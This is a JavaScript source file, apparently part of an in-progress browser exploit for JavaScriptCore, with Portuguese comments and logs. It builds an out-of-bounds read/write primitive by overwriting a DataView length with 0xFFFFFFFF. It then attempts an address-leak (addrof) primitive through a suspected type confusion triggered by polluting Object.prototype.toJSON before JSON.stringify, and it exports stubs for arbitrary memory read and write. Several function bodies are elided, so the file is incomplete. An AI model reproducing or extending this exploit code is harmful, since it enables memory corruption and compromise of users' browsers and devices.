// js/core_exploit.mjs (v31.R21 - Depuração OOB Agressiva em Addrof)

import { AdvancedInt64, isAdvancedInt64Object, PAUSE, toHex } from './utils.mjs';
import { logS3 as log } from './script3/s3_utils.mjs'; 
import { OOB_CONFIG, JSC_OFFSETS, updateOOBConfigFromUI } from './config.mjs';

export let oob_array_buffer_real = null;
export let oob_dataview_real = null;
let isOOBEnvironmentSetup = false; 

const toHexHelper = (val, bits = 32) => toHex(val, bits);

const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58; 
const HEISENBUG_TARGET_MLENGTH_EFFECTIVE_OFFSET = 0x7C; 

const OOB_DV_M_VECTOR_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; 
const OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; 
const OOB_DV_M_MODE_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET;

export function clearOOBEnvironment(options = { force_clear_even_if_not_setup: false, caller_fname: "Unknown" }) { 
    const FNAME_CLEAR = `CoreExploit.clearOOBEnvironment(caller:${options.caller_fname})_R21`;
    const wasSetup = isOOBEnvironmentSetup;
    if (!wasSetup && !options.force_clear_even_if_not_setup && oob_array_buffer_real === null && oob_dataview_real === null) {
        log(`[${FNAME_CLEAR}] Ambiente já limpo e não forçando.`, 'debug');
        return;
    }
    log(`[${FNAME_CLEAR}] Limpando ambiente. Setup anterior: ${wasSetup}. Force: ${options.force_clear_even_if_not_setup}`, 'info');
    oob_array_buffer_real = null; oob_dataview_real = null; isOOBEnvironmentSetup = false;
    log(`[${FNAME_CLEAR}] Ambiente limpo concluído. Novo setup: ${isOOBEnvironmentSetup}`, 'info');
}

export function getOOBAllocationSize() { if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") updateOOBConfigFromUI(document); return OOB_CONFIG.ALLOCATION_SIZE; }
export function getBaseOffsetInDV() { if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") updateOOBConfigFromUI(document); return OOB_CONFIG.BASE_OFFSET_IN_DV; }
export function getInitialBufferSize() { if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") updateOOBConfigFromUI(document); return OOB_CONFIG.INITIAL_BUFFER_SIZE; }

export async function triggerOOB_primitive(options = { force_reinit: false, caller_fname: "Unknown" }) { 
    const FNAME_TRIGGER = `CoreExploit.triggerOOB_primitive(caller:${options.caller_fname})_R21`;
    log(`[${FNAME_TRIGGER}] Início. Force: ${options.force_reinit}. isOOBEnvSetup atual: ${isOOBEnvironmentSetup}. OOB AB: ${oob_array_buffer_real ? 'existe':'null'}. OOB DV: ${oob_dataview_real ? 'existe':'null'}`, 'debug');

    let currentLength = 0;
    if (isOOBEnvironmentSetup && !options.force_reinit) {
        let tempDVValid = false;
        if (oob_dataview_real && oob_array_buffer_real && oob_array_buffer_real.byteLength > OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT + 3) {
            try { currentLength = oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT, true); tempDVValid = true; } 
            catch(e){ currentLength = 0; log(`[${FNAME_TRIGGER}] Exceção ao ler currentLength: ${e.message}`, 'error'); }
        }
        if (tempDVValid && oob_array_buffer_real && oob_dataview_real && oob_array_buffer_real.byteLength === getOOBAllocationSize() && oob_dataview_real.buffer === oob_array_buffer_real && currentLength === 0xFFFFFFFF) {
            log(`[${FNAME_TRIGGER}] Ambiente OOB já OK e expandido. Pulando.`, 'info'); return true;
        } else { 
            log(`[${FNAME_TRIGGER}] OOB Env inconsistente (len:${toHex(currentLength)}). Forçando re-init. Detalhes: DV_valid=${tempDVValid}, AB_len=${oob_array_buffer_real?.byteLength}, expected_alloc=${getOOBAllocationSize()}`, 'warn'); 
            clearOOBEnvironment({ force_clear_even_if_not_setup: true, caller_fname: FNAME_TRIGGER }); 
        }
    } else if (options.force_reinit) {
        log(`[${FNAME_TRIGGER}] Forçando re-inicialização OOB...`, 'info');
        clearOOBEnvironment({ force_clear_even_if_not_setup: true, caller_fname: FNAME_TRIGGER });
    }

    log(`[${FNAME_TRIGGER}] Iniciando Config (Anterior Setup pós-clear: ${isOOBEnvironmentSetup})`, 'test');
    const currentAllocSize = getOOBAllocationSize(); 
    
    try {
        log(`[${FNAME_TRIGGER}] Criando novo ArrayBuffer de tamanho ${currentAllocSize}...`, 'debug');
        oob_array_buffer_real = new ArrayBuffer(currentAllocSize); 
        log(`[${FNAME_TRIGGER}] ArrayBuffer criado. Criando DataView...`, 'debug');
        oob_dataview_real = new DataView(oob_array_buffer_real, 0, currentAllocSize);
        log(`[${FNAME_TRIGGER}] AB e DV criados. Tentando setar isOOBEnvironmentSetup = true`, 'info');
        isOOBEnvironmentSetup = true; 
        log(`[${FNAME_TRIGGER}] isOOBEnvironmentSetup = ${isOOBEnvironmentSetup}. Expandindo m_length...`, 'info');

        if (currentAllocSize > OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT + 3) {
            log(`[${FNAME_TRIGGER}] Escrevendo 0xFFFFFFFF em ${toHexHelper(OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT)}...`, 'debug');
            oob_dataview_real.setUint32(OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT, 0xFFFFFFFF, true);
            const readBackLen = oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT, true);
            if (readBackLen !== 0xFFFFFFFF) {
                isOOBEnvironmentSetup = false; 
                throw new Error(`Falha ao verificar m_length expandido. Lido: ${toHex(readBackLen)}`);
            }
            log(`    m_length do oob_dv (em ${toHexHelper(OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT)}) expandido para 0xFFFFFFFF.`, 'info', FNAME_TRIGGER);
        } else { 
            const eMsg = `Falha ao expandir m_length: AllocSize (${currentAllocSize}) pequeno para offset ${toHexHelper(OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT)}.`; 
            log(eMsg, 'critical', FNAME_TRIGGER); 
            isOOBEnvironmentSetup = false; throw new Error(eMsg); 
        }
        // isOOBEnvironmentSetup já é true aqui
        log(`[${FNAME_TRIGGER}] Ambiente OOB CONFIGURADO. oob_dv.len=${oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT, true)}. isOOBEnvSetup: ${isOOBEnvironmentSetup}`, 'good');
        return true;
    } catch (e) { 
        log(`ERRO CRÍTICO ${FNAME_TRIGGER}: ${e.message}. Stack: ${e.stack}`, 'critical', FNAME_TRIGGER); 
        console.error(e); clearOOBEnvironment({ force_reinit:true, caller_fname: FNAME_TRIGGER }); throw e; 
    }
}

export function oob_read_absolute(offset_in_oob_buffer, byteLength) { /* ... (sem alterações) ... */ }
export function oob_write_absolute(offset_in_oob_buffer, value, byteLength) { /* ... (sem alterações) ... */ }
export function isOOBReady(caller_fname = "Unknown") { /* ... (sem alterações da R18, com logging detalhado) ... */ }
async function _perform_explicit_dv_reset_after_arb_op(fname_parent_for_log) { /* ... */ }
export async function arb_read(absolute_address, byteLength) { /* ... */ }
export async function arb_write(absolute_address, value, byteLength) { /* ... */ }
export async function selfTestOOBReadWrite(logFnParam) { /* ... */ }

const HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC = HEISENBUG_TARGET_MLENGTH_EFFECTIVE_OFFSET; 
const HEISENBUG_CRITICAL_WRITE_VALUE = 0xFFFFFFFF;
const HEISENBUG_ADDROF_VICTIM_BUFFER_SIZE = 8;    

export async function selfTestTypeConfusionAndMemoryControl(logFnParam) { /* ... */ }

// Variáveis para attemptAddrofUsingCoreHeisenbug (R21)
let _targetObjectForCoreAddrof_R21 = null; 
let _core_addrof_tc_confirmed_this_run_R21 = false;
let _core_victim_float_view_for_addrof_R21 = null; 
let _core_addrof_probe_should_process_R21 = false; 

function _toJSONProbeForCoreAddrof_R21() { 
    const FNAME_PROBE = "CoreExploit._toJSONProbeForCoreAddrof_R21";
    let currentThisType = Object.prototype.toString.call(this);
    log(`[${FNAME_PROBE}] 'this' type: ${currentThisType}. Expecting TC? ${_core_addrof_probe_should_process_R21}. TC Already Confirmed? ${_core_addrof_tc_confirmed_this_run_R21}`, "leak");

    if (_core_addrof_probe_should_process_R21 && currentThisType === '[object Object]' && !_core_addrof_tc_confirmed_this_run_R21) { 
        log(`[${FNAME_PROBE}] TC CONFIRMADA para o primeiro [object Object] esperado! Escrevendo targetObject...`, "vuln");
        _core_addrof_tc_confirmed_this_run_R21 = true; 
        _core_addrof_probe_should_process_R21 = false;  

        if (_targetObjectForCoreAddrof_R21 && _core_victim_float_view_for_addrof_R21) {
            try {
                _core_victim_float_view_for_addrof_R21[0] = _targetObjectForCoreAddrof_R21;
                log(`[${FNAME_PROBE}] targetObject escrito em _core_victim_float_view_for_addrof_R21[0].`, "info");
            } catch (e_write) { 
                log(`[${FNAME_PROBE}] ERRO ao escrever targetObject: ${e_write.message}`, "error");
                _core_addrof_tc_confirmed_this_run_R21 = false; 
            }
        } else { 
            log(`[${FNAME_PROBE}] AVISO: targetObject ou float_view não definidos para escrita.`, "warn");
            _core_addrof_tc_confirmed_this_run_R21 = false; 
        }
    } else if (_core_addrof_probe_should_process_R21 && currentThisType !== '[object Object]' && !_core_addrof_tc_confirmed_this_run_R21) {
        // Se ainda estamos esperando o M2 confuso E AINDA NÃO O CONFIRMAMOS, não desativa a flag de expectativa.
        log(`[${FNAME_PROBE}] Esperando M2 confuso, mas 'this' é ${currentThisType}. Flag de expectativa mantida.`, "info");
    } else if (_core_addrof_probe_should_process_R21 && currentThisType === '[object Object]' && _core_addrof_tc_confirmed_this_run_R21) {
        // Já confirmamos a TC e processamos, mas encontramos outro [object Object] enquanto _core_addrof_probe_should_process_R21 ainda era true
        // (o que não deveria acontecer se resetamos o flag acima). Apenas logamos.
        log(`[${FNAME_PROBE}] TC já confirmada, 'this' é ${currentThisType} mas _core_addrof_probe_should_process_R21 ainda era true. Estranho.`, "warn");
         _core_addrof_probe_should_process_R21 = false; // Garante que desativamos
    }
    return { core_addrof_probe_r21_executed: true };
}

export async function attemptAddrofUsingCoreHeisenbug(targetObject) { // MODIFICADO PARA R21
    const FNAME_FUNC = "CoreExploit.attemptAddrofUsingCoreHeisenbug_R21";
    log(`[${FNAME_FUNC}] Iniciando tentativa de addrof R21...`, "info");

    _targetObjectForCoreAddrof_R21 = targetObject; 
    _core_addrof_tc_confirmed_this_run_R21 = false; 
    _core_victim_float_view_for_addrof_R21 = null;
    _core_addrof_probe_should_process_R21 = false;

    let addrof_result = { success: false, message: "Addrof (Heisenbug R21) não iniciado.", leaked_address_as_int64: null, leaked_address_as_double: null };
    let originalToJSON_R21 = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
    let pollutedByCore_R21 = false;

    try {
        log(`[${FNAME_FUNC}] Fase 1: Configurando ambiente OOB...`, 'info');
        await PAUSE(30); // Pequena pausa antes de reconfigurar OOB
        await triggerOOB_primitive({ force_reinit: true, caller_fname: FNAME_FUNC }); 
        await PAUSE(30); // Pequena pausa após reconfigurar
        log(`[${FNAME_FUNC}] triggerOOB_primitive completado. Checando isOOBReady...`, 'info');
        if (!isOOBReady(FNAME_FUNC)) { 
            addrof_result.message = `Falha na inicialização OOB em ${FNAME_FUNC} (isOOBReady falhou).`;
            log(`[${FNAME_FUNC}] ${addrof_result.message}`, "error");
            // Log extra para depurar isOOBReady
            const setupFlag = isOOBEnvironmentSetup;
            const abExists = !!oob_array_buffer_real;
            const dvExists = !!oob_dataview_real;
            log(`[${FNAME_FUNC}] Detalhes da falha de isOOBReady: Setup=${setupFlag}, ABEx=${abExists}, DVEx=${dvExists}`, 'error');
            if(abExists) log(`[${FNAME_FUNC}] AB.byteLength: ${oob_array_buffer_real.byteLength}`, 'error');
            if(dvExists && oob_dataview_real.buffer) log(`[${FNAME_FUNC}] DV.buffer.byteLength: ${oob_dataview_real.buffer.byteLength}`, 'error');
            if(dvExists) try {log(`[${FNAME_FUNC}] DV.getUint32(OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT): ${toHex(oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT,true))}`, 'error');} catch(e){}
            throw new Error(addrof_result.message); 
        }
        log(`[${FNAME_FUNC}] Ambiente OOB pronto. Fase 2: Escrita OOB crítica...`, 'info');

        oob_write_absolute(HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC, HEISENBUG_CRITICAL_WRITE_VALUE, 4);
        log(`[${FNAME_FUNC}] Escrita crítica em ${toHexHelper(HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC)}. Fase 3: Criando vítimas...`, "warn");
        await PAUSE(150); 

        let core_victim_buffer_local = new ArrayBuffer(HEISENBUG_ADDROF_VICTIM_BUFFER_SIZE); 
        _core_victim_float_view_for_addrof_R21 = new Float64Array(core_victim_buffer_local); 
        _core_victim_float_view_for_addrof_R21.fill(0.2121212121); 
        
        let core_m2_victim_local_obj = { m2_marker_field_r21: "core_m2_r21_target" };
        let core_m1_victim = { payload_m2_field_R21: core_m2_victim_local_obj };
        log(`[${FNAME_FUNC}] Estrutura M1/M2 criada. Fase 4: Poluindo e Stringify...`, "info");
        
        Object.defineProperty(Object.prototype, 'toJSON', { value: _toJSONProbeForCoreAddrof_R21, writable: true, configurable: true, enumerable: false });
        pollutedByCore_R21 = true;
        
        _core_addrof_probe_should_process_R21 = true; 
        JSON.stringify(core_m1_victim); 
        // _core_addrof_probe_should_process_R21 já deve ser false se a sonda funcionou
        log(`[${FNAME_FUNC}] JSON.stringify concluído. TC Confirmada Flag: ${_core_addrof_tc_confirmed_this_run_R21}`, "info");
        
        if (_core_addrof_tc_confirmed_this_run_R21) {
            // ... (lógica de resultado como na R19) ...
            const val_double = _core_victim_float_view_for_addrof_R21[0]; addrof_result.leaked_address_as_double = val_double;
            const tb=new ArrayBuffer(8); new Float64Array(tb)[0]=val_double; const tu32=new Uint32Array(tb);
            const la64=new AdvancedInt64(tu32[0],tu32[1]); addrof_result.leaked_address_as_int64=la64;
            log(`[${FNAME_FUNC}] TC INTERNA OK! Lido:Dbl=${val_double},I64=${la64.toString(true)}`,"vuln");
            if(val_double!==0.2121212121&&(la64.low()!==0||la64.high()!==0)){const lhi=la64.high();const nan=(lhi>=0x7FF00000&&lhi<0x80000000)||(lhi>=0xFFF00000&&lhi<0x100000000);if(!nan){addrof_result.success=true;addrof_result.message=`Addrof R21 TC OK. Addr Pot:${la64.toString(true)}`;}else{addrof_result.message=`Addrof R21 TC OK, val ${la64.toString(true)} NaN/Inf.`;}}else{addrof_result.message=`Addrof R21 TC OK, val (${la64.toString(true)}) preenchimento/0.`;}
        } else { addrof_result.message = "Heisenbug TC INTERNA NÃO confirmada pela sonda R21 para o objeto esperado."; }
    } catch (e) { 
        log(`[${FNAME_FUNC}] EXCEPTION CATCH GERAL: ${e.message || String(e)}`, "critical");
        addrof_result.message = `Erro crítico em Addrof R21: ${e.message || String(e)}`; 
    } 
    finally {
        if (pollutedByCore_R21) { if (originalToJSON_R21) Object.defineProperty(Object.prototype, 'toJSON', originalToJSON_R21); else delete Object.prototype.toJSON; }
        _targetObjectForCoreAddrof_R21 = null; _core_victim_float_view_for_addrof_R21 = null; 
        _core_addrof_probe_should_process_R21 = false; 
    }
    log(`[${FNAME_FUNC}] Retornando resultado Addrof R21: ${JSON.stringify(addrof_result)}`, addrof_result.success ? "good" : "warn");
    return addrof_result;
}

export async function getStableConfusedArrayBuffer() { /* ... (sem alterações da R19) ... */ }
export async function get_powerful_dataview_on_oob_buffer() { /* ... (sem alterações da R19) ... */ }
export function read_memory_with_dataview(dv, dv_base_address, target_address, num_bytes, littleEndian = true) { /* ... (sem alterações da R19) ... */ }
export function write_memory_with_dataview(dv, dv_base_address, target_address, value, num_bytes, littleEndian = true) { /* ... (sem alterações da R19) ... */ }
